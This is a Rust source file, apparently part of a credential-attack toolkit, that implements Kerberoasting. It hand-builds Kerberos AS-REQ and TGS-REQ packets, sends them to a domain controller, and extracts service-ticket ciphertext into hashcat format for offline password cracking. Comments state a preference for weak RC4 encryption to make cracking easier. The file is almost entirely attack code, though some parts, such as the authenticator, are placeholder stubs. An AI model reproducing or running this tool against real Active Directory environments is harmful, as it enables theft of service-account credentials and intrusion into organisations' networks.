//! Kerberoasting attack implementation
//!
//! Native Kerberos TGS-REQ attack for extracting service ticket hashes.

use anyhow::{anyhow, Result};
use chrono::Utc;
use log::{debug, info, warn};
use std::collections::HashMap;
use std::net::UdpSocket;

use crate::credentials::types::*;

/// Kerberoasting attack engine
pub struct Kerberoaster {
    /// Configuration
    config: KerberoastConfig,
    /// Extracted hashes
    hashes: Vec<KerberoastResult>,
}

/// Kerberoast configuration
#[derive(Debug, Clone)]
pub struct KerberoastConfig {
    /// Domain controller / KDC
    pub kdc: String,
    /// Realm
    pub realm: String,
    /// User principal for TGT request
    pub user_principal: Option<String>,
    /// Password for TGT request
    pub password: Option<String>,
    /// NTLM hash for TGT request (alternative to password)
    pub ntlm_hash: Option<String>,
    /// Pre-obtained TGT (ccache base64)
    pub tgt: Option<String>,
    /// Request encryption types (prefer weak for easier cracking)
    pub etypes: Vec<i32>,
    /// Timeout in seconds
    pub timeout_secs: u64,
}

impl Default for KerberoastConfig {
    fn default() -> Self {
        Self {
            kdc: String::new(),
            realm: String::new(),
            user_principal: None,
            password: None,
            ntlm_hash: None,
            tgt: None,
            etypes: vec![23, 18, 17, 3], // RC4, AES256, AES128, DES (prefer RC4 for cracking)
            timeout_secs: 10,
        }
    }
}

/// Result from Kerberoasting
#[derive(Debug, Clone)]
pub struct KerberoastResult {
    /// Service principal name
    pub spn: String,
    /// Account name associated with SPN
    pub account: String,
    /// Encryption type
    pub etype: i32,
    /// The hash in hashcat format
    pub hash: String,
    /// Raw ticket data
    pub ticket_data: Vec<u8>,
    /// Timestamp
    pub timestamp: chrono::DateTime<Utc>,
}

impl KerberoastResult {
    /// Get hashcat-compatible format
    pub fn to_hashcat(&self) -> String {
        match self.etype {
            23 => {
                // RC4-HMAC: $krb5tgs$23$*user$realm$spn*$checksum$encrypted
                format!("$krb5tgs$23$*{}${}${}*${}",
                    self.account,
                    self.hash.split('$').nth(1).unwrap_or("REALM"),
                    self.spn.replace('/', "~"),
                    self.hash)
            }
            18 | 17 => {
                // AES: $krb5tgs$18$user$realm$spn$checksum$encrypted
                format!("$krb5tgs${}${}${}${}${}",
                    self.etype,
                    self.account,
                    self.hash.split('$').nth(1).unwrap_or("REALM"),
                    self.spn.replace('/', "~"),
                    self.hash)
            }
            _ => self.hash.clone(),
        }
    }
}

impl Kerberoaster {
    /// Create new Kerberoaster
    pub fn new(config: KerberoastConfig) -> Self {
        Self {
            config,
            hashes: Vec::new(),
        }
    }

    /// Get TGT using credentials
    pub async fn get_tgt(&self) -> Result<Vec<u8>> {
        let user = self.config.user_principal.as_ref()
            .ok_or_else(|| anyhow!("User principal required for TGT"))?;
        let password = self.config.password.as_ref()
            .ok_or_else(|| anyhow!("Password required for TGT"))?;

        info!("Requesting TGT for {}", user);

        // Build AS-REQ with pre-authentication
        let as_req = self.build_as_req_preauth(user, password)?;

        // Send to KDC
        let response = self.send_to_kdc(&as_req)?;

        // Parse AS-REP
        let tgt = self.parse_as_rep(&response)?;

        Ok(tgt)
    }

    /// Request TGS for a specific SPN
    pub async fn request_tgs(&self, spn: &str, tgt: &[u8]) -> Result<KerberoastResult> {
        info!("Requesting TGS for SPN: {}", spn);

        // Build TGS-REQ
        let tgs_req = self.build_tgs_req(spn, tgt)?;

        // Send to KDC
        let response = self.send_to_kdc(&tgs_req)?;

        // Parse TGS-REP and extract hash
        let result = self.parse_tgs_rep(&response, spn)?;

        Ok(result)
    }

    /// Kerberoast multiple SPNs
    pub async fn roast(&mut self, spns: &[ServicePrincipal]) -> Vec<KerberoastResult> {
        let mut results = Vec::new();

        // Get TGT first
        let tgt = match self.config.tgt.as_ref() {
            Some(tgt_b64) => {
                match base64::decode(tgt_b64) {
                    Ok(data) => data,
                    Err(e) => {
                        warn!("Failed to decode TGT: {}", e);
                        return results;
                    }
                }
            }
            None => {
                match self.get_tgt().await {
                    Ok(tgt) => tgt,
                    Err(e) => {
                        warn!("Failed to get TGT: {}", e);
                        return results;
                    }
                }
            }
        };

        info!("Got TGT, requesting {} TGS tickets", spns.len());

        for sp in spns {
            match self.request_tgs(&sp.spn, &tgt).await {
                Ok(mut result) => {
                    result.account = sp.account.clone();
                    info!("Got TGS for {} ({})", sp.spn, sp.account);
                    results.push(result.clone());
                    self.hashes.push(result);
                }
                Err(e) => {
                    warn!("Failed to get TGS for {}: {}", sp.spn, e);
                }
            }
        }

        results
    }

    /// Get all extracted hashes
    pub fn get_hashes(&self) -> &[KerberoastResult] {
        &self.hashes
    }

    /// Convert results to stored credentials
    pub fn to_credentials(&self) -> Vec<StoredCredential> {
        self.hashes.iter().map(|h| {
            StoredCredential {
                id: String::new(),
                credential_type: CredentialType::NtlmHash,
                identity: h.account.clone(),
                domain: Some(self.config.realm.clone()),
                secret: CredentialSecret::Hash {
                    hash_type: format!("kerberos_tgs_{}", h.etype),
                    value: h.to_hashcat(),
                },
                source: CredentialSource::Kerberoasting {
                    spn: h.spn.clone(),
                },
                health: CredentialHealth::default(),
                targets: vec![h.spn.clone()],
                tags: vec!["kerberoasting".to_string()],
                metadata: {
                    let mut m = HashMap::new();
                    m.insert("etype".to_string(), h.etype.to_string());
                    m
                },
                discovered_at: h.timestamp,
                last_verified_at: None,
                expires_at: None,
                last_used_at: None,
            }
        }).collect()
    }

    // Internal methods

    fn build_as_req_preauth(&self, user: &str, password: &str) -> Result<Vec<u8>> {
        // Build AS-REQ with PA-ENC-TIMESTAMP pre-authentication
        let realm = &self.config.realm;
        let timestamp = Utc::now();

        // Calculate encryption key from password
        let key = self.derive_key(password, user, realm, 23)?; // RC4

        // Encrypt timestamp for pre-auth
        let pa_timestamp = self.encrypt_timestamp(&timestamp, &key)?;

        let mut req = Vec::new();

        // Application tag 10 (AS-REQ)
        req.push(0x6a);
        let outer_len_pos = req.len();
        req.push(0x82);
        req.extend_from_slice(&[0x00, 0x00]); // Placeholder for length

        // Sequence
        req.push(0x30);
        let seq_len_pos = req.len();
        req.push(0x82);
        req.extend_from_slice(&[0x00, 0x00]);

        // pvno [1] INTEGER (5)
        req.extend_from_slice(&[0xa1, 0x03, 0x02, 0x01, 0x05]);

        // msg-type [2] INTEGER (10 = AS-REQ)
        req.extend_from_slice(&[0xa2, 0x03, 0x02, 0x01, 0x0a]);

        // padata [3] SEQUENCE OF PA-DATA
        req.push(0xa3);
        let padata_len_pos = req.len();
        req.push(0x82);
        req.extend_from_slice(&[0x00, 0x00]);

        req.push(0x30);
        let padata_seq_len_pos = req.len();
        req.push(0x82);
        req.extend_from_slice(&[0x00, 0x00]);

        // PA-ENC-TIMESTAMP
        req.push(0x30);
        let pa_ts_len_pos = req.len();
        req.push(0x82);
        req.extend_from_slice(&[0x00, 0x00]);

        // padata-type [1] INTEGER (2 = PA-ENC-TIMESTAMP)
        req.extend_from_slice(&[0xa1, 0x03, 0x02, 0x01, 0x02]);

        // padata-value [2] OCTET STRING
        req.push(0xa2);
        req.push(0x82);
        let pa_val_len_pos = req.len();
        req.extend_from_slice(&[0x00, 0x00]);
        req.push(0x04);
        req.push(0x82);
        let pa_data_len_pos = req.len();
        req.extend_from_slice(&[0x00, 0x00]);

        // PA-ENC-TS-ENC
        let pa_ts_enc_start = req.len();
        req.extend_from_slice(&pa_timestamp);
        let pa_ts_enc_len = req.len() - pa_ts_enc_start;

        // Fix PA data length
        let pa_data_len = pa_ts_enc_len;
        req[pa_data_len_pos] = ((pa_data_len >> 8) & 0xff) as u8;
        req[pa_data_len_pos + 1] = (pa_data_len & 0xff) as u8;

        let pa_val_len = pa_data_len + 4;
        req[pa_val_len_pos] = ((pa_val_len >> 8) & 0xff) as u8;
        req[pa_val_len_pos + 1] = (pa_val_len & 0xff) as u8;

        let pa_ts_len = req.len() - pa_ts_len_pos - 3;
        req[pa_ts_len_pos] = ((pa_ts_len >> 8) & 0xff) as u8;
        req[pa_ts_len_pos + 1] = (pa_ts_len & 0xff) as u8;

        let padata_seq_len = req.len() - padata_seq_len_pos - 3;
        req[padata_seq_len_pos] = ((padata_seq_len >> 8) & 0xff) as u8;
        req[padata_seq_len_pos + 1] = (padata_seq_len & 0xff) as u8;

        let padata_len = req.len() - padata_len_pos - 3;
        req[padata_len_pos] = ((padata_len >> 8) & 0xff) as u8;
        req[padata_len_pos + 1] = (padata_len & 0xff) as u8;

        // req-body [4] KDC-REQ-BODY
        req.push(0xa4);
        let body_len_pos = req.len();
        req.push(0x82);
        req.extend_from_slice(&[0x00, 0x00]);

        req.push(0x30);
        let inner_len_pos = req.len();
        req.push(0x82);
        req.extend_from_slice(&[0x00, 0x00]);

        // kdc-options [0]
        req.extend_from_slice(&[0xa0, 0x07, 0x03, 0x05, 0x00, 0x40, 0x81, 0x00, 0x10]);

        // cname [1] PrincipalName
        self.encode_principal_name(&mut req, 0xa1, 1, &[user])?;

        // realm [2] Realm
        req.push(0xa2);
        req.push((realm.len() + 2) as u8);
        req.push(0x1b);
        req.push(realm.len() as u8);
        req.extend_from_slice(realm.as_bytes());

        // sname [3] PrincipalName (krbtgt/REALM)
        self.encode_principal_name(&mut req, 0xa3, 2, &["krbtgt", realm])?;

        // etype [8] SEQUENCE OF Int32
        req.push(0xa8);
        let etype_len = self.config.etypes.len() * 3;
        req.push((etype_len + 2) as u8);
        req.push(0x30);
        req.push(etype_len as u8);
        for etype in &self.config.etypes {
            req.extend_from_slice(&[0x02, 0x01, *etype as u8]);
        }

        // Fix lengths
        let inner_len = req.len() - inner_len_pos - 3;
        req[inner_len_pos] = ((inner_len >> 8) & 0xff) as u8;
        req[inner_len_pos + 1] = (inner_len & 0xff) as u8;

        let body_len = req.len() - body_len_pos - 3;
        req[body_len_pos] = ((body_len >> 8) & 0xff) as u8;
        req[body_len_pos + 1] = (body_len & 0xff) as u8;

        let seq_len = req.len() - seq_len_pos - 3;
        req[seq_len_pos] = ((seq_len >> 8) & 0xff) as u8;
        req[seq_len_pos + 1] = (seq_len & 0xff) as u8;

        let outer_len = req.len() - outer_len_pos - 3;
        req[outer_len_pos] = ((outer_len >> 8) & 0xff) as u8;
        req[outer_len_pos + 1] = (outer_len & 0xff) as u8;

        Ok(req)
    }

    fn build_tgs_req(&self, spn: &str, tgt: &[u8]) -> Result<Vec<u8>> {
        // Build TGS-REQ for service ticket
        let realm = &self.config.realm;

        // Parse SPN (service/host format)
        let spn_parts: Vec<&str> = spn.split('/').collect();
        let sname_parts: Vec<&str> = if spn_parts.len() >= 2 {
            vec![spn_parts[0], spn_parts[1]]
        } else {
            vec![spn]
        };

        let mut req = Vec::new();

        // Application tag 12 (TGS-REQ)
        req.push(0x6c);
        let outer_len_pos = req.len();
        req.push(0x82);
        req.extend_from_slice(&[0x00, 0x00]);

        // Sequence
        req.push(0x30);
        let seq_len_pos = req.len();
        req.push(0x82);
        req.extend_from_slice(&[0x00, 0x00]);

        // pvno [1] INTEGER (5)
        req.extend_from_slice(&[0xa1, 0x03, 0x02, 0x01, 0x05]);

        // msg-type [2] INTEGER (12 = TGS-REQ)
        req.extend_from_slice(&[0xa2, 0x03, 0x02, 0x01, 0x0c]);

        // padata [3] - AP-REQ with TGT
        req.push(0xa3);
        let padata_len_pos = req.len();
        req.push(0x82);
        req.extend_from_slice(&[0x00, 0x00]);

        req.push(0x30);
        let padata_seq_len_pos = req.len();
        req.push(0x82);
        req.extend_from_slice(&[0x00, 0x00]);

        // PA-TGS-REQ
        req.push(0x30);
        let pa_tgs_len_pos = req.len();
        req.push(0x82);
        req.extend_from_slice(&[0x00, 0x00]);

        // padata-type [1] INTEGER (1 = PA-TGS-REQ)
        req.extend_from_slice(&[0xa1, 0x03, 0x02, 0x01, 0x01]);

        // padata-value [2] OCTET STRING containing AP-REQ
        req.push(0xa2);
        let pa_val_len_pos = req.len();
        req.push(0x82);
        req.extend_from_slice(&[0x00, 0x00]);
        req.push(0x04);
        let pa_oct_len_pos = req.len();
        req.push(0x82);
        req.extend_from_slice(&[0x00, 0x00]);

        // AP-REQ (simplified - would normally include encrypted authenticator)
        let ap_req_start = req.len();
        // Application 14 (AP-REQ)
        req.push(0x6e);
        req.push(0x82);
        let ap_req_len_pos = req.len();
        req.extend_from_slice(&[0x00, 0x00]);
        req.push(0x30);
        let ap_seq_len_pos = req.len();
        req.push(0x82);
        req.extend_from_slice(&[0x00, 0x00]);

        // pvno [0] INTEGER
        req.extend_from_slice(&[0xa0, 0x03, 0x02, 0x01, 0x05]);

        // msg-type [1] INTEGER (14)
        req.extend_from_slice(&[0xa1, 0x03, 0x02, 0x01, 0x0e]);

        // ap-options [2] APOptions
        req.extend_from_slice(&[0xa2, 0x05, 0x03, 0x03, 0x00, 0x00, 0x00]);

        // ticket [3] - the TGT
        req.push(0xa3);
        req.push(0x82);
        let ticket_len_pos = req.len();
        req.extend_from_slice(&[0x00, 0x00]);
        req.extend_from_slice(tgt);
        let ticket_len = tgt.len();
        req[ticket_len_pos] = ((ticket_len >> 8) & 0xff) as u8;
        req[ticket_len_pos + 1] = (ticket_len & 0xff) as u8;

        // authenticator [4] - encrypted
        // For simplicity, including a minimal authenticator structure
        let authenticator_data = self.build_authenticator()?;
        req.push(0xa4);
        req.push(0x82);
        let auth_len_pos = req.len();
        req.extend_from_slice(&[0x00, 0x00]);
        let auth_start = req.len();
        req.extend_from_slice(&authenticator_data);
        let auth_len = req.len() - auth_start;
        req[auth_len_pos] = ((auth_len >> 8) & 0xff) as u8;
        req[auth_len_pos + 1] = (auth_len & 0xff) as u8;

        // Fix AP-REQ lengths
        let ap_seq_len = req.len() - ap_seq_len_pos - 3;
        req[ap_seq_len_pos] = ((ap_seq_len >> 8) & 0xff) as u8;
        req[ap_seq_len_pos + 1] = (ap_seq_len & 0xff) as u8;

        let ap_req_len = req.len() - ap_req_len_pos - 3;
        req[ap_req_len_pos] = ((ap_req_len >> 8) & 0xff) as u8;
        req[ap_req_len_pos + 1] = (ap_req_len & 0xff) as u8;

        let pa_oct_len = req.len() - pa_oct_len_pos - 3;
        req[pa_oct_len_pos] = ((pa_oct_len >> 8) & 0xff) as u8;
        req[pa_oct_len_pos + 1] = (pa_oct_len & 0xff) as u8;

        let pa_val_len = req.len() - pa_val_len_pos - 3;
        req[pa_val_len_pos] = ((pa_val_len >> 8) & 0xff) as u8;
        req[pa_val_len_pos + 1] = (pa_val_len & 0xff) as u8;

        let pa_tgs_len = req.len() - pa_tgs_len_pos - 3;
        req[pa_tgs_len_pos] = ((pa_tgs_len >> 8) & 0xff) as u8;
        req[pa_tgs_len_pos + 1] = (pa_tgs_len & 0xff) as u8;

        let padata_seq_len = req.len() - padata_seq_len_pos - 3;
        req[padata_seq_len_pos] = ((padata_seq_len >> 8) & 0xff) as u8;
        req[padata_seq_len_pos + 1] = (padata_seq_len & 0xff) as u8;

        let padata_len = req.len() - padata_len_pos - 3;
        req[padata_len_pos] = ((padata_len >> 8) & 0xff) as u8;
        req[padata_len_pos + 1] = (padata_len & 0xff) as u8;

        // req-body [4] KDC-REQ-BODY
        req.push(0xa4);
        let body_len_pos = req.len();
        req.push(0x82);
        req.extend_from_slice(&[0x00, 0x00]);

        req.push(0x30);
        let inner_len_pos = req.len();
        req.push(0x82);
        req.extend_from_slice(&[0x00, 0x00]);

        // kdc-options [0]
        req.extend_from_slice(&[0xa0, 0x07, 0x03, 0x05, 0x00, 0x40, 0x81, 0x00, 0x00]);

        // realm [2] Realm
        req.push(0xa2);
        req.push((realm.len() + 2) as u8);
        req.push(0x1b);
        req.push(realm.len() as u8);
        req.extend_from_slice(realm.as_bytes());

        // sname [3] PrincipalName (service principal)
        self.encode_principal_name(&mut req, 0xa3, 2, &sname_parts)?;

        // etype [8] SEQUENCE OF Int32 - request RC4 for easier cracking
        req.push(0xa8);
        let etype_len = self.config.etypes.len() * 3;
        req.push((etype_len + 2) as u8);
        req.push(0x30);
        req.push(etype_len as u8);
        for etype in &self.config.etypes {
            req.extend_from_slice(&[0x02, 0x01, *etype as u8]);
        }

        // Fix lengths
        let inner_len = req.len() - inner_len_pos - 3;
        req[inner_len_pos] = ((inner_len >> 8) & 0xff) as u8;
        req[inner_len_pos + 1] = (inner_len & 0xff) as u8;

        let body_len = req.len() - body_len_pos - 3;
        req[body_len_pos] = ((body_len >> 8) & 0xff) as u8;
        req[body_len_pos + 1] = (body_len & 0xff) as u8;

        let seq_len = req.len() - seq_len_pos - 3;
        req[seq_len_pos] = ((seq_len >> 8) & 0xff) as u8;
        req[seq_len_pos + 1] = (seq_len & 0xff) as u8;

        let outer_len = req.len() - outer_len_pos - 3;
        req[outer_len_pos] = ((outer_len >> 8) & 0xff) as u8;
        req[outer_len_pos + 1] = (outer_len & 0xff) as u8;

        Ok(req)
    }

    fn build_authenticator(&self) -> Result<Vec<u8>> {
        // Build minimal encrypted authenticator
        // In real implementation, this would be properly encrypted
        let mut auth = Vec::new();

        // EncryptedData
        auth.push(0x30);
        let outer_len_pos = auth.len();
        auth.push(0x00);

        // etype [0] INTEGER
        auth.extend_from_slice(&[0xa0, 0x03, 0x02, 0x01, 0x17]); // RC4

        // cipher [2] OCTET STRING
        auth.push(0xa2);
        auth.push(0x10);
        auth.push(0x04);
        auth.push(0x0e);
        // Placeholder cipher data
        auth.extend_from_slice(&[0x00; 14]);

        let outer_len = auth.len() - outer_len_pos - 1;
        auth[outer_len_pos] = outer_len as u8;

        Ok(auth)
    }

    fn encode_principal_name(&self, buf: &mut Vec<u8>, tag: u8, name_type: u8, parts: &[&str]) -> Result<()> {
        buf.push(tag);
        let tag_len_pos = buf.len();
        buf.push(0x82);
        buf.extend_from_slice(&[0x00, 0x00]);

        buf.push(0x30);
        let seq_len_pos = buf.len();
        buf.push(0x82);
        buf.extend_from_slice(&[0x00, 0x00]);

        // name-type [0] INTEGER
        buf.extend_from_slice(&[0xa0, 0x03, 0x02, 0x01, name_type]);

        // name-string [1] SEQUENCE OF GeneralString
        buf.push(0xa1);
        let names_len_pos = buf.len();
        buf.push(0x82);
        buf.extend_from_slice(&[0x00, 0x00]);

        buf.push(0x30);
        let names_seq_len_pos = buf.len();
        buf.push(0x82);
        buf.extend_from_slice(&[0x00, 0x00]);

        for part in parts {
            buf.push(0x1b); // GeneralString
            if part.len() < 0x80 {
                buf.push(part.len() as u8);
            } else {
                buf.push(0x82);
                buf.push(((part.len() >> 8) & 0xff) as u8);
                buf.push((part.len() & 0xff) as u8);
            }
            buf.extend_from_slice(part.as_bytes());
        }

        let names_seq_len = buf.len() - names_seq_len_pos - 3;
        buf[names_seq_len_pos] = ((names_seq_len >> 8) & 0xff) as u8;
        buf[names_seq_len_pos + 1] = (names_seq_len & 0xff) as u8;

        let names_len = buf.len() - names_len_pos - 3;
        buf[names_len_pos] = ((names_len >> 8) & 0xff) as u8;
        buf[names_len_pos + 1] = (names_len & 0xff) as u8;

        let seq_len = buf.len() - seq_len_pos - 3;
        buf[seq_len_pos] = ((seq_len >> 8) & 0xff) as u8;
        buf[seq_len_pos + 1] = (seq_len & 0xff) as u8;

        let tag_len = buf.len() - tag_len_pos - 3;
        buf[tag_len_pos] = ((tag_len >> 8) & 0xff) as u8;
        buf[tag_len_pos + 1] = (tag_len & 0xff) as u8;

        Ok(())
    }

    fn send_to_kdc(&self, request: &[u8]) -> Result<Vec<u8>> {
        let addr = if self.config.kdc.contains(':') {
            self.config.kdc.clone()
        } else {
            format!("{}:88", self.config.kdc)
        };

        let socket = UdpSocket::bind("0.0.0.0:0")?;
        socket.set_read_timeout(Some(std::time::Duration::from_secs(self.config.timeout_secs)))?;
        socket.connect(&addr)?;
        socket.send(request)?;

        let mut buf = [0u8; 65535];
        let len = socket.recv(&mut buf)?;

        Ok(buf[..len].to_vec())
    }

    fn parse_as_rep(&self, data: &[u8]) -> Result<Vec<u8>> {
        if data.is_empty() {
            return Err(anyhow!("Empty response"));
        }

        // Check for error
        if data[0] == 0x7e {
            let error_code = self.extract_krb_error_code(data);
            return Err(anyhow!("Kerberos error: {:?}", error_code));
        }

        // Check for AS-REP (0x6b = Application 11)
        if data[0] != 0x6b {
            return Err(anyhow!("Unexpected response type: {:#x}", data[0]));
        }

        // Extract ticket from AS-REP
        // ticket is tagged [5] within AS-REP
        self.extract_ticket(data, 0xa5)
    }

    fn parse_tgs_rep(&self, data: &[u8], spn: &str) -> Result<KerberoastResult> {
        if data.is_empty() {
            return Err(anyhow!("Empty response"));
        }

        // Check for error
        if data[0] == 0x7e {
            let error_code = self.extract_krb_error_code(data);
            return Err(anyhow!("Kerberos error: {:?}", error_code));
        }

        // Check for TGS-REP (0x6d = Application 13)
        if data[0] != 0x6d {
            return Err(anyhow!("Unexpected response type: {:#x}", data[0]));
        }

        // Extract ticket from TGS-REP
        let ticket_data = self.extract_ticket(data, 0xa5)?;

        // Extract encryption type and encrypted part for cracking
        let (etype, cipher) = self.extract_enc_part(data)?;

        // Format hash for hashcat
        let hash = hex::encode(&cipher);

        Ok(KerberoastResult {
            spn: spn.to_string(),
            account: String::new(), // Will be filled later
            etype,
            hash,
            ticket_data,
            timestamp: Utc::now(),
        })
    }

    fn extract_ticket(&self, data: &[u8], tag: u8) -> Result<Vec<u8>> {
        // Find the ticket in the response
        let mut i = 0;
        while i < data.len().saturating_sub(10) {
            if data[i] == tag {
                // Found ticket tag, extract length
                let (len, offset) = self.parse_asn1_length(&data[i + 1..])?;
                let start = i + 1 + offset;
                let end = start + len;
                if end <= data.len() {
                    return Ok(data[start..end].to_vec());
                }
            }
            i += 1;
        }

        Err(anyhow!("Ticket not found in response"))
    }

    fn extract_enc_part(&self, data: &[u8]) -> Result<(i32, Vec<u8>)> {
        // Find enc-part [6] in TGS-REP
        let mut i = 0;
        while i < data.len().saturating_sub(20) {
            if data[i] == 0xa6 { // enc-part tag
                // Parse EncryptedData structure
                let (_len, offset) = self.parse_asn1_length(&data[i + 1..])?;
                let enc_start = i + 1 + offset;

                // Find etype [0] and cipher [2]
                let etype = self.find_integer_value(&data[enc_start..], 0xa0)
                    .unwrap_or(23);

                let cipher = self.find_octet_string(&data[enc_start..], 0xa2)
                    .unwrap_or_default();

                return Ok((etype, cipher));
            }
            i += 1;
        }

        Err(anyhow!("enc-part not found"))
    }

    fn find_integer_value(&self, data: &[u8], tag: u8) -> Option<i32> {
        let mut i = 0;
        while i < data.len().saturating_sub(4) {
            if data[i] == tag {
                if data[i + 1] == 0x03 && data[i + 2] == 0x02 && data[i + 3] == 0x01 {
                    return Some(data[i + 4] as i32);
                }
            }
            i += 1;
        }
        None
    }

    fn find_octet_string(&self, data: &[u8], tag: u8) -> Option<Vec<u8>> {
        let mut i = 0;
        while i < data.len().saturating_sub(6) {
            if data[i] == tag {
                let (len, offset) = self.parse_asn1_length(&data[i + 1..]).ok()?;
                let start = i + 1 + offset;

                // Skip OCTET STRING tag
                if data[start] == 0x04 {
                    let (inner_len, inner_offset) = self.parse_asn1_length(&data[start + 1..]).ok()?;
                    let data_start = start + 1 + inner_offset;
                    let data_end = data_start + inner_len;
                    if data_end <= data.len() {
                        return Some(data[data_start..data_end].to_vec());
                    }
                }
            }
            i += 1;
        }
        None
    }

    fn parse_asn1_length(&self, data: &[u8]) -> Result<(usize, usize)> {
        if data.is_empty() {
            return Err(anyhow!("Empty data for length"));
        }

        if data[0] < 0x80 {
            Ok((data[0] as usize, 1))
        } else if data[0] == 0x81 {
            if data.len() < 2 {
                return Err(anyhow!("Truncated length"));
            }
            Ok((data[1] as usize, 2))
        } else if data[0] == 0x82 {
            if data.len() < 3 {
                return Err(anyhow!("Truncated length"));
            }
            Ok((((data[1] as usize) << 8) | (data[2] as usize), 3))
        } else {
            Err(anyhow!("Unsupported length encoding"))
        }
    }

    fn extract_krb_error_code(&self, data: &[u8]) -> Option<i32> {
        let mut i = 0;
        while i < data.len().saturating_sub(4) {
            if data[i] == 0xa6 { // error-code tag
                if data[i + 1] == 0x03 && data[i + 2] == 0x02 && data[i + 3] == 0x01 {
                    return Some(data[i + 4] as i32);
                }
            }
            i += 1;
        }
        None
    }

    fn derive_key(&self, password: &str, user: &str, realm: &str, etype: i32) -> Result<Vec<u8>> {
        let salt = format!("{}{}", realm.to_uppercase(), user);

        match etype {
            23 => {
                // RC4-HMAC: NTLM hash of password
                use md4::{Md4, Digest};
                let utf16: Vec<u8> = password.encode_utf16()
                    .flat_map(|c| c.to_le_bytes())
                    .collect();

                let mut hasher = Md4::new();
                hasher.update(&utf16);
                Ok(hasher.finalize().to_vec())
            }
            18 | 17 => {
                // AES: PBKDF2-SHA1
                use pbkdf2::pbkdf2_hmac;
                use sha1::Sha1;

                let iterations = 4096;
                let key_len = if etype == 18 { 32 } else { 16 };
                let mut key = vec![0u8; key_len];

                pbkdf2_hmac::<Sha1>(
                    password.as_bytes(),
                    salt.as_bytes(),
                    iterations,
                    &mut key
                );

                Ok(key)
            }
            _ => Err(anyhow!("Unsupported encryption type: {}", etype)),
        }
    }

    fn encrypt_timestamp(&self, timestamp: &chrono::DateTime<Utc>, key: &[u8]) -> Result<Vec<u8>> {
        // Build PA-ENC-TS-ENC structure and encrypt
        // Simplified - real implementation would do proper encryption

        let ts_str = timestamp.format("%Y%m%d%H%M%SZ").to_string();

        let mut ts_enc = Vec::new();
        ts_enc.push(0x30);
        ts_enc.push((ts_str.len() + 4) as u8);
        ts_enc.push(0xa0);
        ts_enc.push((ts_str.len() + 2) as u8);
        ts_enc.push(0x18); // GeneralizedTime
        ts_enc.push(ts_str.len() as u8);
        ts_enc.extend_from_slice(ts_str.as_bytes());

        // Encrypt with RC4-HMAC (simplified)
        let encrypted = self.rc4_encrypt(key, &ts_enc, 1)?; // usage = 1 for PA-ENC-TIMESTAMP

        // Wrap in EncryptedData
        let mut result = Vec::new();
        result.push(0x30);
        result.push((encrypted.len() + 10) as u8);
        result.extend_from_slice(&[0xa0, 0x03, 0x02, 0x01, 0x17]); // etype = 23
        result.push(0xa2);
        result.push((encrypted.len() + 2) as u8);
        result.push(0x04);
        result.push(encrypted.len() as u8);
        result.extend_from_slice(&encrypted);

        Ok(result)
    }

    fn rc4_encrypt(&self, key: &[u8], data: &[u8], usage: u8) -> Result<Vec<u8>> {
        use hmac::{Hmac, Mac};
        use md5::Md5;

        // Derive session key from key and usage
        let mut hmac = Hmac::<Md5>::new_from_slice(key)
            .map_err(|_| anyhow!("HMAC error"))?;
        hmac.update(&[usage, 0, 0, 0]);
        let k1 = hmac.finalize().into_bytes();

        // Generate confounder (random)
        let confounder: [u8; 8] = rand::random();

        // Calculate checksum
        let mut to_sign = Vec::new();
        to_sign.extend_from_slice(&confounder);
        to_sign.extend_from_slice(data);

        let mut hmac = Hmac::<Md5>::new_from_slice(&k1)
            .map_err(|_| anyhow!("HMAC error"))?;
        hmac.update(&to_sign);
        let checksum = hmac.finalize().into_bytes();

        // Derive encryption key
        let mut hmac = Hmac::<Md5>::new_from_slice(&k1)
            .map_err(|_| anyhow!("HMAC error"))?;
        hmac.update(&checksum);
        let k2 = hmac.finalize().into_bytes();

        // RC4 encrypt
        let mut encrypted = to_sign.clone();
        self.rc4_cipher(&k2, &mut encrypted);

        // Result: checksum + encrypted
        let mut result = Vec::new();
        result.extend_from_slice(&checksum);
        result.extend_from_slice(&encrypted);

        Ok(result)
    }

    fn rc4_cipher(&self, key: &[u8], data: &mut [u8]) {
        // RC4 implementation
        let mut s: [u8; 256] = [0; 256];
        for i in 0..256 {
            s[i] = i as u8;
        }

        let mut j: u8 = 0;
        for i in 0..256 {
            j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
            s.swap(i, j as usize);
        }

        let mut i: u8 = 0;
        let mut j: u8 = 0;
        for byte in data.iter_mut() {
            i = i.wrapping_add(1);
            j = j.wrapping_add(s[i as usize]);
            s.swap(i as usize, j as usize);
            let k = s[(s[i as usize].wrapping_add(s[j as usize])) as usize];
            *byte ^= k;
        }
    }
}

/// Service principal for Kerberoasting
#[derive(Debug, Clone)]
pub struct ServicePrincipal {
    /// The SPN (e.g., "MSSQLSvc/server.domain.com:1433")
    pub spn: String,
    /// Account that owns this SPN
    pub account: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_kerberoast_result_format() {
        let result = KerberoastResult {
            spn: "MSSQLSvc/server.domain.com:1433".to_string(),
            account: "svc_sql".to_string(),
            etype: 23,
            hash: "abcdef1234567890".to_string(),
            ticket_data: Vec::new(),
            timestamp: Utc::now(),
        };

        let hashcat = result.to_hashcat();
        assert!(hashcat.starts_with("$krb5tgs$23$*"));
    }
}
